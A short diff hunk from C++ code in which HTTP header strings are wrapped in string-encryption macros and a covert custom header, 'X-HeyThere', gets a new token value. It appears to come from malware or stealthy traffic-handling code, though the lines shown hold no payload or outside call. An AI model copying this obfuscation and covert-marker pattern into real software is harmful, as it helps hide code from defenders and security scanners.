@@ -726,7 +726,7 @@ void InitApi()
    Strs::fc9  = ENC_STR_A"text/html"END_ENC_STR;
    Strs::fc10 = ENC_STR_A"\r\nLocation: "END_ENC_STR;
    Strs::fc11 = ENC_STR_A"\r\nContent-Length: "END_ENC_STR;
-   Strs::fc12 = ENC_STR_A"X-HeyThere: HtRGeyznv7k"END_ENC_STR;
+   Strs::fc12 = ENC_STR_A"X-HeyThere: 5eYEp80n3hM"END_ENC_STR; //HtRGeyznv7k
   
    Strs::headersEnd = ENC_STR_A"\r\n\r\n"END_ENC_STR;
 
